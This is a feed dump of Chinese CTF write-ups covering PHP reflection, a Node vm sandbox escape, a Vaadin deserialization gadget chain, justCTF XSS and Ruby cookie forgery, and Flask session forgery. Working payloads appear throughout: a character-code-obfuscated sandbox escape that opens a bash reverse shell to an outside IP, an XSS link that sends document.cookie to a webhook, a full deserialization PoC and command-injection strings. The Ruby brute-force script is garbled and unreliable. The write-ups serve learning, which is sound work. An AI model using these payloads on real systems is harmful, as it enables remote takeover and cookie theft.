class="variable">$flag</span>,<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个反射的话去google一下就会出来</p><p>这里的编码的原因是因为又是这个不可见字符搞的鬼</p><p><img src="../images/image-20230611180412719.png" alt="image-20230611180412719"></p><p><img src="../images/image-20230611180503819.png" alt="image-20230611180503819"></p><p><strong>总结</strong></p><ul><li>php反射修改属性</li><li>不可见字符的url编码</li></ul><p><strong>这题还有个非预期</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=system%<span class="number">0</span>a(<span class="string">&#x27;ls /&#x27;</span>);</span><br><span class="line">a=system%<span class="number">0</span>a(<span class="string">&#x27;cat /flag&#x27;</span>);</span><br></pre></td></tr></table></figure><h2 id="Esc4pe-T0-Mong0"><a href="#Esc4pe-T0-Mong0" class="headerlink" title="Esc4pe_T0_Mong0"></a><strong>Esc4pe_T0_Mong0</strong></h2><p>这道题是一道沙箱逃逸的题目  网上可以搜到CVE</p><p>题目给了源码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Code</span> <span class="title class_">Execution</span> <span class="title class_">Demo</span></span><br><span class="line"><span class="number">2</span>+<span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Execute</span> <span class="title class_">Read</span> <span class="title class_">Source</span> <span class="title class_">Code</span></span><br><span class="line"><span class="title class_">Source</span> <span class="title class_">Code</span>:</span><br><span class="line"><span class="comment">//const &#123; MongoClient &#125; = require(&quot;mongodb&quot;);</span></span><br><span class="line"><span class="comment">//const client = new MongoClient(&quot;mongodb://localhost:27017/&quot;);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">isValidCode</span> = (<span class="params">code</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> isLengthValid = code.<span class="property">length</span> &lt; <span class="number">365</span>;</span><br><span class="line">    <span class="keyword">const</span> isASCII = <span class="regexp">/^[\x20-\x7e]+$/</span>.<span class="title function_">test</span>(code);</span><br><span class="line">    <span class="keyword">const</span> containsInvalidChars = <span class="regexp">/[.\[\]&#123;&#125;\s;`&#x27;&quot;/\\_&lt;&gt;?:]/</span>.<span class="title function_">test</span>(code);</span><br><span class="line">    <span class="keyword">const</span> doesNotContainImport = !code.<span class="title function_">toLowerCase</span>().<span class="title function_">includes</span>(<span class="string">&quot;import&quot;</span>);</span><br><span class="line">    <span class="keyword">const</span> doesNotContainUnescape = !<span class="regexp">/%(?:d0|d1|%[89abAB][0-9a-fA-F])/</span>.<span class="title function_">test</span>(code);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      isLengthValid &amp;&amp;</span><br><span class="line">      isASCII &amp;&amp;</span><br><span class="line">      !containsInvalidChars &amp;&amp;</span><br><span class="line">      doesNotContainImport &amp;&amp;</span><br><span class="line">      doesNotContainUnescape</span><br><span class="line">    );</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>());</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    res.<span class="title function_">sendFile</span>( __dirname + <span class="string">&quot;/static/index.html&quot;</span> );</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/readfile&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    res.<span class="title function_">sendFile</span>( __dirname + <span class="string">&quot;/app.js&quot;</span> );</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/exec&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> code = req.<span class="property">query</span>.<span class="property">code</span>;</span><br><span class="line">    <span class="keyword">if</span> (!code) &#123;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">json</span>(&#123; <span class="attr">error</span>: <span class="string">&#x27;Code is required.&#x27;</span> &#125;);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_">isValidCode</span>(code)) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">const</span> sandbox = &#123;&#125;;</span><br><span class="line">            <span class="keyword">const</span> script = <span class="keyword">new</span> vm.<span class="title class_">Script</span>(code);</span><br><span class="line">            <span class="keyword">const</span> result = script.<span class="title function_">runInNewContext</span>(sandbox);</span><br><span class="line">            res.<span class="title function_">json</span>(&#123; result &#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">            res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">json</span>(&#123; <span class="attr">error</span>: err.<span class="property">message</span> &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">json</span>(&#123; <span class="attr">error</span>: <span class="string">&#x27;you cant bypass my vm best waf!&#x27;</span> &#125;);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//app.get(&#x27;/getflag&#x27;, function (req, res) &#123;</span></span><br><span class="line"><span class="comment">//    todo...</span></span><br><span class="line"><span class="comment">//&#125;);</span></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="function">() =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`nodeapp listening on http://localhost:3000`</span>));</span><br></pre></td></tr></table></figure><p>代码执行在这一块</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> sandbox = &#123;&#125;;</span><br><span class="line"><span class="keyword">const</span> script = <span class="keyword">new</span> vm.<span class="title class_">Script</span>(code);</span><br><span class="line"><span class="keyword">const</span> result = script.<span class="title function_">runInNewContext</span>(sandbox);</span><br><span class="line">res.<span class="title function_">json</span>(&#123; result &#125;);</span><br></pre></td></tr></table></figure><p>直接搜索mongo vm 沙箱逃逸就文章就出来了   poc也出来了</p><p><img src="../images/image-20230611213840311.png" alt="image-20230611213840311"></p><p>但是这里的会对我们传进来的值进行过滤</p><p><img src="../images/image-20230611213635442.png" alt="image-20230611213635442"></p><p>这是过滤内容</p><p>这里的话因为存在过滤，所以使用with替代<code>.</code>,用ascii替代其他字符  这里的正则是必须得用ascii  括号里的内容必须得用，括号外的就可以直接写字母</p><p><strong>payload</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">with</span>(<span class="title class_">String</span>)<span class="title function_">with</span>(f=fromCharCode,<span class="variable language_">this</span>)<span class="title function_">with</span>(constructor)<span class="title function_">with</span>(<span class="title function_">constructor</span>(<span class="params">f(r=<span class="number">114</span>,e=<span class="number">101</span>,t=<span class="number">116</span>,<span class="number">117</span>,r,<span class="number">110</span>,<span class="number">32</span>,p=<span class="number">112</span>,r,<span class="number">111</span>,c=<span class="number">99</span>,e,s=<span class="number">115</span>,s)</span>)(<span class="params"></span>))<span class="title function_">with</span>(mainModule)<span class="title function_">with</span>(<span class="built_in">require</span>(<span class="title function_">f</span>(c,h=<span class="number">104</span>,<span class="number">105</span>,<span class="number">108</span>,<span class="number">100</span>,<span class="number">95</span>,p,r,<span class="number">111</span>,c,e,s,s)))<span class="title function_">exec</span>(<span class="title function_">f</span>(<span class="number">98</span>,<span class="number">97</span>,s,h,<span class="number">32</span>,<span class="number">45</span>,c,<span class="number">32</span>,<span class="number">34</span>,<span class="number">98</span>,<span class="number">97</span>,s,h,<span class="number">32</span>,<span class="number">45</span>,<span class="number">105</span>,<span class="number">32</span>,<span class="number">62</span>,<span class="number">38</span>,<span class="number">32</span>,<span class="number">47</span>,<span class="number">100</span>,e,<span class="number">118</span>,<span class="number">47</span>,t,c,p,<span class="number">47</span>,a=<span class="number">52</span>,<span class="number">55</span>,<span class="number">46</span>,b=<span class="number">49</span>,<span class="number">48</span>,a,<span class="number">46</span>,b,a,<span class="number">46</span>,b,<span class="number">54</span>,<span class="number">48</span>,<span class="number">47</span>,b,a,a,a,<span class="number">32</span>,<span class="number">48</span>,<span class="number">62</span>,<span class="number">38</span>,b,<span class="number">34</span>))</span><br></pre></td></tr></table></figure><p><strong>把ascii转化一下就能看到原本的样子了</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> 陕西省赛—web-2023 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java-vaadin</title>
      <link href="/posts/7d138d32.html"/>
      <url>/posts/7d138d32.html</url>
      
        <content type="html"><![CDATA[<p><a href="https://su18.org/post/ysoserial-su18-5/">参考文章</a></p><h2 id="Vaadin1"><a href="#Vaadin1" class="headerlink" title="Vaadin1"></a>Vaadin1</h2><p>Vaadin 是一个在Java后端快速开发web应用程序的平台。用 Java 或 TypeScript 构建可伸缩的 UI，并使用集成的工具、组件和设计系统来更快地迭代、更好地设计和简化开发过程。</p><p>又是一个没有听说过的平台框架。Vaadin 的反序列化调用链同样十分简单，依旧是使用反射调用 getter 方法的类来触发 TemplatesImpl 利用链，接下来看一下具体的调用点。</p><p>(<strong>这里写这个链子的原因是以为这个链子会是用反射来触发getter方法</strong>)   —-&gt;   <strong>可以考虑一下和fastjson共用</strong></p><h3 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h3><p>先装一下maven依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.vaadin<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>vaadin-server<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>7.7.14<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="NestedMethodProperty"><a href="#NestedMethodProperty" class="headerlink" title="NestedMethodProperty"></a>NestedMethodProperty</h4><p><code>com.vaadin.data.util.NestedMethodProperty</code> 类是一个封装访问属性方法的类。构造方法接收两个参数，一个是对象实例，一个是属性值。初始化时将调用 initialize 方法获取实例类中的相关信息存放在成员变量中。</p><p><img src="../images/image-20230609094402190.png" alt="image-20230609094402190"></p><p>等到调用 <code>NestedMethodProperty</code> 的 <code>getValue</code> 方法时，就会反射调用封装对象指定属性的 <code>getter</code> 方法。</p><p><img src="../images/image-20230609094455778.png" alt="image-20230609094455778"></p><p>因此这个类又是可以触发 TemplatesImpl 的利用方式。</p><p>(<strong>接下来就是找哪个类的某个方法能触发这个getValue方法了</strong>)</p><h4 id="PropertysetItem"><a href="#PropertysetItem" class="headerlink" title="PropertysetItem"></a>PropertysetItem</h4><p>触发类是 <code>com.vaadin.data.util.PropertysetItem</code> ，这个类用来存储 Property 属性值，为其映射一个 id 对象。</p><p>数据存放在成员变量 map 中，想要获取相应属性时，则调用 <code>getItemProperty</code> 方法在 map 中获取。</p><p><img src="../images/image-20230609094752009.png" alt="image-20230609094752009"></p><p>映射的 id 对象则储存在成员变量 list 中。</p><p><img src="../images/image-20230609094809632.png" alt="image-20230609094809632"></p><p>PropertysetItem 的 toString 方法，获取全部 id 对象并遍历，使用 getItemProperty 方法获取映射的 Property 属性对象，并调用其 getValue 方法。</p><p><img src="../images/image-20230609094935073.png" alt="image-20230609094935073"></p><p>这是获取id对象是因为  </p><p><img src="../images/image-20230609095105195.png" alt="image-20230609095105195"></p><p>所以说通过id这个对象就能找到<code>Property</code>这个属性的值</p><p>因此可以使用 <code>PropertysetItem</code> 的 <code>toString</code> 方法触发 <code>NestedMethodProperty</code> 的 <code>getValue</code> 方法。完成漏洞链的构造。</p><h3 id="攻击构造"><a href="#攻击构造" class="headerlink" title="攻击构造"></a>攻击构造</h3><p><strong>poc</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.vaadin.data.util.NestedMethodProperty;</span><br><span class="line"><span class="keyword">import</span> com.vaadin.data.util.PropertysetItem;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Vaadin</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 生成包含恶意类字节码的 TemplatesImpl 类</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">tmpl</span> <span class="operator">=</span> SerializeUtil.generateTemplatesImpl();</span><br><span class="line"></span><br><span class="line">        <span class="type">PropertysetItem</span> <span class="variable">pItem</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PropertysetItem</span>();</span><br><span class="line"></span><br><span class="line">        NestedMethodProperty&lt;Object&gt; nmprop = <span class="keyword">new</span> <span class="title class_">NestedMethodProperty</span>&lt;Object&gt;(tmpl, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        pItem.addItemProperty(<span class="string">&quot;outputProperties&quot;</span>, nmprop);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 实例化 BadAttributeValueExpException 并反射写入</span></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">exception</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="string">&quot;su18&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span>     <span class="operator">=</span> BadAttributeValueExpException.class.getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(exception, pItem);</span><br><span class="line"></span><br><span class="line">        SerializeUtil.writeObjectToFile(exception);</span><br><span class="line">        SerializeUtil.readFileObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230609102414521.png" alt="image-20230609102414521"></p><p><strong>第一步是传入一个对象和一个<code>propertyName</code>属性</strong></p><p><strong>第二步是给<code>propertyName</code>这个属性映射一个id对象</strong>    </p><p><img src="../images/image-20230609102614981.png" alt="image-20230609102614981"></p><p>这里的话是使用<code>BadAttributeValueExpException</code>这个类来触发<code>toString()</code>方法</p><p>然后就会会调用到<code>PropertysetItem#toString()</code> 方法，然后遍历的时候会调用到<code>NestedMethodProperty#getValue()</code>方法  然后反射调用<code>TemplatesImpl 类</code></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><strong>1.利用说明</strong></p><ul><li>反序列化 BadAttributeValueExpException 触发 PropertysetItem 的 toString 方法 调用到 NestedMethodProperty 的 getValue 方法。</li></ul><p><strong>2.Gadget总结</strong></p><ul><li>kick-off gadget：<code>javax.management.BadAttributeValueExpException#readObject()</code></li><li><p>sink gadget：<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#getOutputProperties()</code></p></li><li><p>chain gadget：<code>com.vaadin.data.util.NestedMethodProperty#getValue()</code></p></li></ul><p><strong>3.调用链展示</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">BadAttributeValueExpException.readObject()</span><br><span class="line">    PropertysetItem.toString()</span><br><span class="line">            PropertysetItem.getPropertyId()</span><br><span class="line">                NestedMethodProperty.getValue()</span><br><span class="line">                    TemplatesImpl.getObjectPropertyValue()</span><br></pre></td></tr></table></figure><p><strong>4.依赖版本</strong></p><p><code>vaadin-server : 7.7.14</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> java-vaadin </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>justctf2023-web</title>
      <link href="/posts/ddd9620c.html"/>
      <url>/posts/ddd9620c.html</url>
      
        <content type="html"><![CDATA[<h2 id="eXtra-Safe-Security-layers"><a href="#eXtra-Safe-Security-layers" class="headerlink" title="eXtra Safe Security layers"></a>eXtra Safe Security layers</h2><p>道题的考点是       <strong>xss和nodejs代码审计</strong>   </p><p>首先他给了一个压缩包，是题目的源码</p><p><img src="../images/image-20230606153236064.png" alt="image-20230606153236064"></p><p>然后我们来进行分析</p><p><strong>关键点在这</strong></p><p><img src="../images/image-20230606153335616.png" alt="image-20230606153335616"></p><p>就是这里可以进行重新修改<code>res.user</code>的值</p><p><img src="../images/image-20230606153431868.png" alt="image-20230606153431868"></p><p>然后<code>res.user</code>的结构是这样的那么我们就可以修改</p><p> <code>unmodifiable.background</code>和一个 <code>unmodifiable.CSP</code>属性</p><p><img src="../images/image-20230606153555797.png" alt="image-20230606153555797"></p><p>然后又返回到这里，如果<code>res.user.unmodifiable.CSP</code>不为空的话就返回它，如果为空就返回<code>defaultCSP</code></p><p><strong>讲了这么多，最关键的地方来了</strong></p><p><img src="../images/image-20230606153804851.png" alt="image-20230606153804851"></p><p>这里的话会对我们的<code>unmodifiable.background</code>进行渲染并且加载</p><p>结合之前我们知道的可以对 <code>unmodifiable.background</code>和一个 <code>unmodifiable.CSP</code>属性进行修改，然后左上角<code>report</code>一下，让机器人去访问这个页面，就可以拿到这个admin页面的cookie了</p><ul><li><strong>payload</strong></li></ul><p><code>http://xssl.web.jctf.pro/?text=hi&amp;[unmodifiable][CSP]=a&amp;[unmodifiable][background]=https://webhook.site/f202667e-9179-425d-80c1-fd62da5915d4?$&#123;document.cookie&#125;</code></p><p>(<strong>国外的题目最好用这种接收http返回信息的网站，用国内vps的话会接收不到</strong>)</p><p>在这种情况下，这会将 document.cookie 发送到上面的 webhook。现在我们只需使用“报告为不当”按钮进行报告，服务器机器人就会访问此链接。机器人将通过 webhook 将 cookie 发送给我们：</p><p><img src="../images/image-20230606154247092.png" alt="image-20230606154247092"></p><p>成功加载我们构造的<code>background</code>,然后report让机器人去访问</p><p><img src="../images/image-20230606154332347.png" alt="image-20230606154332347"></p><p><img src="../images/image-20230606154344800.png" alt="image-20230606154344800"></p><p>拿到flag</p><h2 id="Dangerous-ruby"><a href="#Dangerous-ruby" class="headerlink" title="Dangerous(ruby)"></a>Dangerous(ruby)</h2><p><a href="https://www.youtube.com/watch?v=fqOcV-T_Qsc">wp讲解</a></p><p>这道题是考察ruby的  <strong>cookie伪造  和ip伪造</strong></p><p>就是通过题目代码给的构造<code>cookie</code>和<code>ip</code>的模板，然后根据这个模板重新构造<code>cookie</code>和<code>ip</code></p><p>  <img src="../images/image-20230606163847914.png" alt="image-20230606163847914"></p><p>题目还是先给了一个文件，让我们来审计代码</p><p>首先我们来看一下这个获取flag的要求</p><p><img src="../images/image-20230606164057404.png" alt="image-20230606164057404"></p><p>这里话是判断<code>username</code>和<code>ip</code>满不满足条件，满足的话就会返回flag</p><p><img src="../images/image-20230606164333686.png" alt="image-20230606164333686"></p><p>然后看这里的前端代码  这里的reply是下面的样子，</p><p><img src="../images/image-20230606164427160.png" alt="image-20230606164427160"></p><p><img src="../images/image-20230606164534853.png" alt="image-20230606164534853"></p><p>和上述页面对应上了</p><p>这就是这个页面返回的结果    (<strong>并且还返回了admin的用户名</strong>)</p><p>但是我们得进行session的伪造，以为现在的<strong>session.user</strong>并不是<code>janitor</code></p><p><img src="../images/image-20230606165011293.png" alt="image-20230606165011293"></p><p>点进去这个<code>new thread</code>的时候会返回一堆信息</p><p><img src="../images/image-20230606165116320.png" alt="image-20230606165116320"></p><p>这里返回了一个最关键的信息就是cookie是咋样生成的，并且还给了生成cookie的secret</p><p>然后我们就可以进行伪造了</p><p><code>:coder=&gt;#&lt;Rack::Protection::EncryptedCookie::Marshal:0x00007ff401b9a530&gt;&#125;</code>根据这个模板来进行</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&#x27;sinatra&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;encrypted_cookie&#x27;</span></span><br><span class="line"></span><br><span class="line">use <span class="title class_">Rack</span><span class="symbol">:</span><span class="symbol">:Protection</span><span class="symbol">:</span><span class="symbol">:EncryptedCookie</span>,</span><br><span class="line">  <span class="symbol">:secret</span> =&gt; <span class="string">&#x27;a9316e61bc75029d52f915823d7bb628a4adae8b174bce89fd38ec4c7fb925a07e2ccbc01572b9fdce56502ef5d02609e5194a5ddd649ff349a206002e96a99d&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">get <span class="string">&#x27;/&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  session[<span class="symbol">:username</span>] = <span class="string">&#x27;janitor&#x27;</span></span><br><span class="line">  <span class="string">&quot;session: &quot;</span> + session.inspect + request.ip</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>然后把cookie进行传参，就可以绕过第一个检测了</p><p>接下来我们就得看看ip怎么进行伪造了</p><p><img src="../images/image-20230606173836307.png" alt="image-20230606173836307"></p><p><strong>就是这里的会对ip和id相加后进行加密后，然后截取</strong></p><p><img src="../images/image-20230606173937628.png" alt="image-20230606173937628"></p><p><img src="../images/image-20230606173951264.png" alt="image-20230606173951264"></p><p>然后写个脚本来对这个ip进行破解</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&quot;digest&quot;</span></span><br><span class="line"><span class="keyword">for</span> d <span class="keyword">in</span> <span class="number">0</span>..<span class="number">255</span> <span class="keyword">do</span></span><br><span class="line">  puts d</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> <span class="number">0</span>..<span class="number">255</span> <span class="keyword">do</span></span><br><span class="line">      <span class="keyword">for</span> b <span class="keyword">in</span> @..<span class="number">255</span> <span class="keyword">do</span></span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> <span class="number">0</span>..<span class="number">255</span> <span class="keyword">do</span></span><br><span class="line">          <span class="keyword">if</span> <span class="title class_">Digest</span><span class="symbol">:</span><span class="symbol">:SHA256</span>.hexdigestd.to <span class="number">5</span>+<span class="string">&quot;.&quot;</span>+c.to s+<span class="string">&quot;.&quot;</span>+b.to <span class="number">5</span>+<span class="string">&quot;.&quot;</span> + a.to <span class="number">5</span> + <span class="string">&quot;1&quot;</span>).slice(<span class="number">0</span>, <span class="number">6</span>) == <span class="string">&quot;32cae2&quot;</span></span><br><span class="line">            <span class="keyword">if</span> <span class="title class_">Digest</span><span class="symbol">:</span><span class="symbol">:SHA256</span>.hexdigest(d.to <span class="number">5</span>+<span class="string">&quot;.&quot;</span>+.to s+<span class="string">&quot;.&quot;</span>+b.to <span class="number">5</span>+<span class="string">&quot;.&quot;</span> + a.to <span class="number">5</span> + <span class="string">&quot;2&quot;</span>).slice(<span class="number">0</span>, <span class="number">6</span>) == <span class="string">&quot;92e1e8&#x27;</span></span><br><span class="line"><span class="string">              puts d.to s+&quot;</span>.<span class="string">&quot;+c.to s+&quot;</span>.<span class="string">&quot;+b.to s+&quot;</span>.<span class="string">&quot;+ a.to s</span></span><br><span class="line"><span class="string">            end</span></span><br><span class="line"><span class="string">          end</span></span><br><span class="line"><span class="string">        end</span></span><br><span class="line"><span class="string">      end</span></span><br><span class="line"><span class="string">    end</span></span><br><span class="line"><span class="string">  end</span></span><br><span class="line"><span class="string">end</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">puts &quot;</span>finished<span class="string">&quot;</span></span><br></pre></td></tr></table></figure><p>然后提交之后就会返回flag</p>]]></content>
      
      
      
        <tags>
            
            <tag> justctf2023-web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NSS-round13-web</title>
      <link href="/posts/8e9667d4.html"/>
      <url>/posts/8e9667d4.html</url>
      
        <content type="html"><![CDATA[<h2 id="flask-jwt"><a href="#flask-jwt" class="headerlink" title="flask?jwt?"></a>flask?jwt?</h2><p>考察的是session伪造</p><p>(不写了，就是简单的session伪造)</p><h2 id="flask-jwt-hard-session伪造"><a href="#flask-jwt-hard-session伪造" class="headerlink" title="flask?jwt?(hard,session伪造)"></a>flask?jwt?(hard,session伪造)</h2><p><strong>考察的也是session伪造  只不过这里把key藏起来了，我们得去找到</strong></p><p>这里的考点是通过报错来获取到<code>secret_key</code></p><p>注册完后进行登录</p><p><img src="../images/image-20230604173436773.png" alt="image-20230604173436773"></p><p>提示你有这个<code>/wor</code>目录</p><p><img src="../images/image-20230604173501780.png" alt="image-20230604173501780"></p><p>告诉你了登录时间(<strong>那么我们就去找一下登录时间是从哪获取的</strong>)</p><p><img src="../images/image-20230604173742024.png" alt="image-20230604173742024"></p><p>然后我们尝试去删除一点点cookie的值使其报错</p><p><img src="../images/image-20230604173954408.png" alt="image-20230604173954408"></p><p>报错之后查看到的信息不全面，那么我们就去拿bp进行发包查看</p><p><img src="../images/image-20230604174055787.png" alt="image-20230604174055787"></p><p>然后就拿到<code>secret_key</code>了   那么我们就接着去重新构造一个cookie就行了</p><p><img src="../images/image-20230604174519826.png" 